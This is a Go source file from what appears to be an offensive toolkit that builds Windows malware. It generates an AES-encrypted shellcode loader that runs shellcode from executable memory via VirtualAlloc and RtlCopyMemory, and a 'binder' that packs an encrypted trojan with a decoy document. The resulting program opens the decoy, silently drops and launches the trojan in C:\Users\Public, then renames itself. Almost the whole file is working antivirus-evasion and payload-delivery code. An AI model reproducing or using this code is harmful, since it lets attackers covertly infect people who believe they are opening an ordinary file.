package service

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
)

func fileReader(filePath string) []byte {
	f := filePath
	file, err := ioutil.ReadFile(f)
	if err != nil {
		fmt.Println("出错了：", err)
		return nil
	}
	return file
}

func BinderAES1(shellcode string, fileName string, binderFilePath string, binderFileName string) { // 主
	file := fileReader(binderFilePath) //读取下载下来文件的[]byte
	func(shellcde string) {
		aescode := "package main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"os\"\n)\n\nconst (\n\tStdLen  = 16\n\tUUIDLen = 20\n\tiv      = \"0000000000000000\"\n)\n\nvar StdChars = []byte(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\")\n\nfunc Get_aes_key() []byte {\n\treturn NewLenChars(StdLen, StdChars)\n}\n\n// NewLenChars returns a new random string of the provided length, consisting of the provided byte slice of allowed characters(maximum 256).\nfunc NewLenChars(length int, chars []byte) []byte {\n\tif length == 0 {\n\t\t_ = 1\n\t}\n\tclen := len(chars)\n\tif clen < 2 || clen > 256 {\n\t\tpanic(\"Wrong charset length for NewLenChars()\")\n\t}\n\tmaxrb := 255 - (256 % clen)\n\tb := make([]byte, length)\n\tr := make([]byte, length+(length/4)) // storage for random bytes.\n\ti := 0\n\tfor {\n\t\tif _, err := rand.Read(r); err != nil {\n\t\t\tpanic(\"Error reading random bytes: \" + err.Error())\n\t\t}\n\t\tfor _, rb := range r {\n\t\t\tc := int(rb)\n\t\t\tif c > maxrb {\n\t\t\t\tcontinue // Skip this number to avoid modulo bias.\n\t\t\t}\n\t\t\tb[i] = chars[c%clen]\n\t\t\ti++\n\t\t\tif i == length {\n\t\t\t\treturn b\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc PKCS5Padding(ciphertext []byte, blockSize int) []byte {\n\tpadding := blockSize - len(ciphertext)%blockSize\n\tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n\treturn append(ciphertext, padtext...)\n}\n\nfunc PKCS5UnPadding(origData []byte) []byte {\n\tlength := len(origData)\n\tunpadding := int(origData[length-1])\n\treturn origData[:(length - unpadding)]\n}\nfunc AesDecrypt(decodeStr string, key []byte) ([]byte, error) {\n\tdecodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblockMode := cipher.NewCBCDecrypter(block, []byte(iv))\n\torigData := make([]byte, len(decodeBytes))\n\tblockMode.CryptBlocks(origData, decodeBytes)\n\torigData = PKCS5UnPadding(origData)\n\treturn origData, nil\n}\n\nfunc AesEncrypt(encodeBytes []byte, key []byte) (string, error) {\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tblockSize := block.BlockSize()\n\tfmt.Println(blockSize)\n\tencodeBytes = PKCS5Padding(encodeBytes, blockSize)\n\tblockMode := cipher.NewCBCEncrypter(block, []byte(iv))\n\tcrypted := make([]byte, len(encodeBytes))\n\tblockMode.CryptBlocks(crypted, encodeBytes)\n\treturn base64.StdEncoding.EncodeToString(crypted), nil\n}\n\nfunc Write_AES_shellcde(aes_shellcode string) {\n\tloader := \"package main\\n\\nimport (\\n\\t\\\"crypto/aes\\\"\\n\\t\\\"crypto/cipher\\\"\\n\\t\\\"encoding/base64\\\"\\n\\t\\\"fmt\\\"\\n\\t\\\"syscall\\\"\\n\\t\\\"unsafe\\\"\\n)\\n\\nvar iv = \\\"0000000000000000\\\"\\n\\nfunc PKCS5UnPadding(origData []byte) []byte {\\n\\tlength := len(origData)\\n\\tunpadding := int(origData[length-1])\\n\\treturn origData[:(length - unpadding)]\\n}\\nfunc AesDecrypt(decodeStr string, key []byte) ([]byte, error) {\\n\\tdecodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\tblock, err := aes.NewCipher(key)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\tblockMode := cipher.NewCBCDecrypter(block, []byte(iv))\\n\\torigData := make([]byte, len(decodeBytes))\\n\\n\\tblockMode.CryptBlocks(origData, decodeBytes)\\n\\torigData = PKCS5UnPadding(origData)\\n\\treturn origData, nil\\n}\\n\\nfunc CError(err error) {\\n\\tif err != nil {\\n\\t\\tfmt.Println(err)\\n\\t\\treturn\\n\\t}\\n\\treturn\\n}\\n\\nconst (\\n\\tMEM_COMMIT             = 0x1000\\n\\tMEM_RESERVE            = 0x2000\\n\\tPAGE_EXECUTE_READWRITE = 0x40\\n\\tKEY_1                  = 90\\n\\tKEY_2                  = 91\\n)\\n\\nvar (\\n\\tkernel32      = syscall.MustLoadDLL(\\\"kernel32.dll\\\")\\n\\tntdll         = syscall.MustLoadDLL(\\\"ntdll.dll\\\")\\n\\tVirtualAlloc  = kernel32.MustFindProc(\\\"VirtualAlloc\\\")\\n\\tRtlCopyMemory = ntdll.MustFindProc(\\\"RtlCopyMemory\\\")\\n)\\n\\nfunc main() {\\n\\tvar enc_key1 = \\\"wqzwsxedc\\\"\\n\\tvar enc_key2 = \\\"1234567\\\"\\n\\tvar info_list = [...]string{\\\"sasa2sasas1sssaas\\\", \\\"ssssasa\\\", \\\"\" + aes_shellcode + \"\\\"}\\n\\tshellcode, _ := AesDecrypt(info_list[2], []byte(enc_key1+enc_key2))\\n\\taddr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\\n\\tif err != nil && err.Error() != \\\"The operation completed successfully.\\\" {\\n\\t\\tsyscall.Exit(0)\\n\\t}\\n\\t_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))\\n\\tif err != nil && err.Error() != \\\"The operation completed successfully.\\\" {\\n\\t\\tsyscall.Exit(0)\\n\\t}\\n\\tsyscall.Syscall(addr, 0, 0, 0, 0)\\n\\n}\"\n\tfileObj1, err := os.OpenFile(\"F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go\", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)\n\tif err != nil {\n\t\tfmt.Println(\"打开文件出错了:\", err)\n\t\treturn\n\t}\n\tdefer fileObj1.Close()\n\twr := bufio.NewWriter(fileObj1)\n\twr.WriteString(loader)\n\twr.Flush()\n}\n\nfunc main() {\n\tvar payload = []byte{" + shellcde + "}\n\tkey := \"wqzwsxedc1234567\"\n\tb, _ := AesEncrypt([]byte(payload), []byte(key))\n\tfmt.Println(\"key: \" + string(key))\n\tWrite_AES_shellcde(b)\n\tfmt.Println(\"enc_info: \" + string(b))\n}"
		fileObjAescode, err1 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644) // /aes1/aes/main.go
		if err1 != nil {
			fmt.Println("打开文件出错了:", err1)
			return
		}
		defer fileObjAescode.Close()
		aescodewr := bufio.NewWriter(fileObjAescode)
		aescodewr.WriteString(aescode)
		aescodewr.Flush()
	}(shellcode)
	exec.Command("go", "run", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go").Run()
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go")
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go")
	exec.Command("python", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/service/executable/compile.py", "-w", "AES2", "-f", fileName).Run() //, "-ldflags=\"-H", "windowsgui\""
	exeFile, _ := ioutil.ReadFile("./" + fileName + ".exe")
	defer Delete_File("./" + fileName + ".exe")
	// exeFile1 := fmt.Sprintf("%#v", exeFile)
	// file1 := fmt.Sprintf("%#v", file)
	BinderFileExe := BinderFileExe(fileName, binderFileName, "1234567890987654", exeFile, file)
	fileObjBinderFileExe, err1 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
	if err1 != nil {
		fmt.Println("打开文件出错了:", err1)
		return
	}
	defer fileObjBinderFileExe.Close()
	BinderFileExewr := bufio.NewWriter(fileObjBinderFileExe)
	BinderFileExewr.WriteString(BinderFileExe)
	BinderFileExewr.Flush()
	exec.Command("python", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/service/executable/compile.py", "-w", "BinderAES1", "-f", binderFileName).Run() //, "-ldflags=\"-H", "windowsgui\""
}

func BinderFileExe(mumaFileName string, docFileName string, key string, muMaByte []byte, pdfByte []byte) string {
	var mumafileStr string = string(muMaByte[:])
	AesmumafileStr := AesEncrypt(mumafileStr, key)
	var docfileStr string = string(pdfByte[:])
	AesdocfileStr := AesEncrypt(docfileStr, key)
	SourceCode := fmt.Sprintf(`
	package main
	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/base64"
		"log"
		"os"
		"os/exec"
		"path/filepath"
		"strings"
		"syscall"
		"time"
	)
	
	func main() {
		mumafilename := "%s"
		docfilename := "%s"
		key := "%s"
		numafile := "%s"
		docfile := "%s"
	
		dmumafile := AesDecrypt(numafile, key)
		ddocfile := AesDecrypt(docfile, key)
	
		f, _ := os.Create("C:\\Users\\Public\\" + mumafilename)
	
		_, _ = f.Write([]byte(dmumafile))
		f.Close()
		f2, _ := os.Create(docfilename)
		_, _ = f2.Write([]byte(ddocfile))
		f2.Close()
		exitfile(GetCurrentDirectory() + "/" + docfilename)
		exitfile("C:\\Users\\Public\\" + mumafilename)
	
		cmd := exec.Command("cmd", " /c "+GetCurrentDirectory()+"/"+docfilename)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		//cmd.Stdout = os.Stdout
		cmd.Start()
	
		cmd2 := exec.Command("cmd", " /c "+"C:\\Users\\Public\\"+mumafilename)
		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		//cmd2.Stdout = os.Stdout
		_ = cmd2.Start()
	
		selfile, _ := os.Executable()
		os.Rename(selfile, "C:\\Users\\Public\\cool.v1")
	}
	func exitfile(filename string) {
		for {
			time.Sleep(time.Duration(1) * time.Second)
			_, err := os.Stat(filename)
			if err == nil {
				break
			}
		}
	}
	func GetCurrentDirectory() string {
		selfile, _ := os.Executable()
		dir, err := filepath.Abs(filepath.Dir(selfile))
		if err != nil {
			log.Fatal(err)
		}
	
		return strings.Replace(dir, "\\", "/", -1)
	}
	
	func PKCS7UnPadding(origData []byte) []byte {
		length := len(origData)
		unpadding := int(origData[length-1])
		return origData[:(length - unpadding)]
	}
	func AesDecrypt(cryted string, key string) string {
		crytedByte, _ := base64.StdEncoding.DecodeString(cryted)
		k := []byte(key)
		block, _ := aes.NewCipher(k)
		blockSize := block.BlockSize()
		blockMode := cipher.NewCBCDecrypter(block, k[:blockSize])
		orig := make([]byte, len(crytedByte))
		blockMode.CryptBlocks(orig, crytedByte)
		orig = PKCS7UnPadding(orig)
		return string(orig)
	}
	`, mumaFileName+".exe", docFileName, key, AesmumafileStr, AesdocfileStr)
	return SourceCode
}

func PKCS7Padding(ciphertext []byte, blocksize int) []byte {
	padding := blocksize - len(ciphertext)%blocksize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func AesEncrypt(orig string, key string) string {
	origData := []byte(orig)
	k := []byte(key)
	block, _ := aes.NewCipher(k)
	blockSize := block.BlockSize()
	origData = PKCS7Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, k[:blockSize])
	cryted := make([]byte, len(origData))
	blockMode.CryptBlocks(cryted, origData)
	return base64.StdEncoding.EncodeToString(cryted)
}
